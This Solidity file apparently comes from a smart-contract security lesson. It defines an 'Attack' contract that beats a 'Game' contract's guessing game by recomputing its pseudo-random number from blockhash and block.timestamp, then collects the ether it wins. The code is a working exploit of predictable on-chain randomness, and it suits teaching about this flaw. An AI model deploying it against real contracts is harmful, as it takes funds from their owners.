// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "./Game.sol";

contract Attack {

    Game game;

    constructor(address gameAddress) {
        game = Game(gameAddress);
    }

    // Attacks the `Game` contract by guessing the exact number because `blockhash` and `block.timestamp`
    // is accessible publicly

    function attack() public {
        uint256 _guess = uint256(
                         keccak256 (
                         abi.encodePacked(blockhash(block.number), block.timestamp)
                         )        
                         );

        game.guess(_guess);
    }


    // Gets called when the contract receives ether

    receive() external payable {}


}